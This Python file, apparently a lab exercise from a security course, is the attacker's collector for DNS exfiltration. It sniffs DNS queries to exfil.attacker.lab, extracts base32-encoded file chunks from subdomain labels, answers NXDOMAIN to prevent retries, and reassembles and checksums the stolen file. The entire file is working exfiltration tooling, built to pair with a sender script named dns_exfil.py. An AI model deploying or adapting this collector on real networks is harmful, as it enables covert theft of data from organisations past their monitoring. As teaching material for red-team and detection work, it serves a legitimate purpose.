#!/usr/bin/env python3
"""
Module 6 — Exercise 6-B: DNS Exfiltration Collector (Attacker's DNS Server)

Listens on UDP/53, parses incoming DNS queries from dns_exfil.py,
and reassembles the exfiltrated file.

Query format (from dns_exfil.py):
  announce: start.<total>.<checksum>.<session>.exfil.attacker.lab
  data:     <chunk>.<seq>.<session>.exfil.attacker.lab
  end:      end.<total>.<checksum>.<session>.exfil.attacker.lab

Responds to each query with a valid DNS reply (NXDOMAIN or A record)
to prevent the sender's resolver from retrying.

Usage:
  sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/received_file

  # Or specify port if 53 is taken:
  sudo python3 module6/dns_collector.py --port 5353 --output /tmp/test.txt
"""

import argparse
import base64
import hashlib
import os
import socket
import time
from collections import defaultdict

from scapy.all import (
    IP, UDP, DNS, DNSQR, DNSRR,
    sniff, send,
    conf,
)

conf.verb = 0

EXFIL_SUFFIX = ".exfil.attacker.lab"

# Per-session state: {session_id: {seq: chunk_str}}
sessions: dict[str, dict] = defaultdict(lambda: {
    "chunks": {},
    "total": None,
    "checksum": None,
    "start_time": None,
    "complete": False,
})


# ── DNS response builder ───────────────────────────────────────────────────────

def send_dns_reply(pkt, qname: str):
    """Send NXDOMAIN response to keep sender happy and prevent retries."""
    reply = (
        IP(dst=pkt[IP].src)
        / UDP(dport=pkt[UDP].sport, sport=53)
        / DNS(
            id=pkt[DNS].id,
            qr=1,       # response
            aa=1,       # authoritative
            rcode=3,    # NXDOMAIN
            qd=pkt[DNS].qd,
        )
    )
    send(reply, verbose=False)


# ── Query parser ──────────────────────────────────────────────────────────────

def parse_query(qname: str) -> dict | None:
    """
    Parse a DNS query name and extract exfiltration data.
    Returns dict with type, session_id, data etc., or None if not ours.
    """
    # Strip trailing dot that Scapy adds
    qname = qname.rstrip(".")

    if EXFIL_SUFFIX.lstrip(".") not in qname:
        return None

    # Remove the suffix and split
    base = qname.replace(EXFIL_SUFFIX.lstrip("."), "").rstrip(".")
    # Remove the root domain portion
    for suffix in [".exfil.attacker.lab", "exfil.attacker.lab"]:
        if qname.endswith(suffix):
            base = qname[:-len(suffix)].rstrip(".")
            break

    parts = base.split(".")

    if not parts:
        return None

    if parts[0] == "start" and len(parts) >= 4:
        return {
            "type": "announce",
            "total": int(parts[1]),
            "checksum": parts[2],
            "session_id": parts[3],
        }
    elif parts[0] == "end" and len(parts) >= 4:
        return {
            "type": "end",
            "total": int(parts[1]),
            "checksum": parts[2],
            "session_id": parts[3],
        }
    elif len(parts) >= 3:
        return {
            "type": "data",
            "chunk": parts[0],
            "seq": int(parts[1]),
            "session_id": parts[2],
        }

    return None


# ── Reassembly ─────────────────────────────────────────────────────────────────

def reassemble(session_id: str, output_path: str | None) -> bool:
    """
    Attempt to reassemble the file for this session.
    Returns True if successful.
    """
    state = sessions[session_id]

    if state["total"] is None or not state["chunks"]:
        return False

    expected_seqs = set(range(state["total"]))
    received_seqs = set(state["chunks"].keys())
    missing = expected_seqs - received_seqs

    if missing:
        print(f"  [session {session_id}] Missing {len(missing)} chunks: {sorted(missing)[:10]}...")
        return False

    # Reassemble base32 string in order
    encoded = "".join(state["chunks"][s] for s in sorted(state["chunks"]))
    # Pad base32 to multiple of 8
    pad = (8 - len(encoded) % 8) % 8
    encoded_padded = (encoded + "=" * pad).upper()

    try:
        data = base64.b32decode(encoded_padded)
    except Exception as e:
        print(f"  [session {session_id}] Decode error: {e}")
        return False

    # Verify checksum
    actual_checksum = hashlib.md5(data).hexdigest()[:8]
    if state["checksum"] and actual_checksum != state["checksum"]:
        print(f"  [session {session_id}] Checksum MISMATCH! "
              f"expected={state['checksum']}  got={actual_checksum}")
    else:
        print(f"  [session {session_id}] Checksum OK ({actual_checksum})")

    # Save or print
    if output_path:
        with open(output_path, "wb") as f:
            f.write(data)
        print(f"  [session {session_id}] File saved to {output_path} ({len(data)} bytes)")
    else:
        print(f"\n{'='*50}")
        print(f"[+] Reassembled file ({len(data)} bytes):")
        print(data.decode(errors="replace")[:2048])
        if len(data) > 2048:
            print(f"  ... (truncated, {len(data) - 2048} more bytes)")

    state["complete"] = True
    return True


# ── Main packet handler ────────────────────────────────────────────────────────

def packet_handler(pkt, output_path: str | None):
    if not (pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt.haslayer(UDP)):
        return
    if pkt[DNS].qr != 0:   # skip responses
        return

    qname = pkt[DNSQR].qname.decode(errors="replace")
    parsed = parse_query(qname)

    if parsed is None:
        return

    # Send DNS reply to prevent retries
    try:
        send_dns_reply(pkt, qname)
    except Exception:
        pass

    sid = parsed.get("session_id", "unknown")
    state = sessions[sid]

    if parsed["type"] == "announce":
        state["total"]      = parsed["total"]
        state["checksum"]   = parsed["checksum"]
        state["start_time"] = time.time()
        print(f"\n[+] New session: {sid}  total_chunks={parsed['total']}  "
              f"checksum={parsed['checksum']}")

    elif parsed["type"] == "data":
        state["chunks"][parsed["seq"]] = parsed["chunk"]
        total = state["total"] or "?"
        print(f"\r  [session {sid}] chunk {len(state['chunks'])}/{total}", end="", flush=True)

    elif parsed["type"] == "end":
        print(f"\n[*] End marker received for session {sid}")
        reassemble(sid, output_path)


def main():
    parser = argparse.ArgumentParser(description="DNS exfiltration collector")
    parser.add_argument("--iface",  default=conf.iface)
    parser.add_argument("--port",   type=int, default=53)
    parser.add_argument("--output", default=None, help="Output file path (default: print to stdout)")
    args = parser.parse_args()

    print(f"[*] DNS Exfiltration Collector")
    print(f"[*] Listening on {args.iface} port {args.port}")
    print(f"[*] Watching for *.exfil.attacker.lab queries")
    if args.output:
        print(f"[*] Output: {args.output}")
    print()

    bpf = f"udp port {args.port}"

    try:
        sniff(
            iface=args.iface,
            filter=bpf,
            prn=lambda p: packet_handler(p, args.output),
            store=False,
        )
    except KeyboardInterrupt:
        print("\n[*] Collector stopped")

        # Print summary of incomplete sessions
        incomplete = {sid: s for sid, s in sessions.items() if not s["complete"]}
        if incomplete:
            print(f"\n[!] {len(incomplete)} incomplete session(s):")
            for sid, state in incomplete.items():
                received = len(state["chunks"])
                total = state["total"] or "?"
                print(f"  session {sid}: {received}/{total} chunks received")


if __name__ == "__main__":
    main()
